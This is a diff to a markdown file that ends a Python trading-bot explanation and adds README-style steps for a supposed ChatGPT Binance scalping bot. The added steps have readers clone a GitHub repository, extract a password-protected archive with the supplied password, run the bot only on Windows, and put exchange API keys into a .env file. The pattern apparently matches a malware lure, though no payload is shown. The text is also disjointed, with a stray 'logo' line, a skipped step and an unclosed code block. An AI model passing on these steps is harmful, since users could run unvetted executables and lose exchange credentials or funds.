@@ -48,4 +48,23 @@ for index, row in df.iterrows():
         in_trade = False
 ```
 This version maintains the same functionality while condensing the code by removing redundant adjustments in the moving average calculations and simplifying the code structure.
-# Next, I wrote and compiled a javascript program based on this example
+# Next, I wrote and compiled a javascript program based on this example that looks like this:
+logo
+
+# To use this bot, follow these steps
+1. **Clone the repository:**
+
+
+   ```bash
+   git clone https://github.com/exileqeq/chatgpt-binance-scalping.git
+   cd chatgpt-binance-scalping
+3. **extract archive with pass `3a4w6iZsbu`**
+4. **Configure your environment:**
+In the `.env` file, specify the necessary api keys
+5. **Define the trading pair and timeframe**
+# Requirments 
+1. Windows 10/11
+2. Insert api keys into the .env file
+
+# Warning 
+This bot is a test bot, the developer is not responsible for it
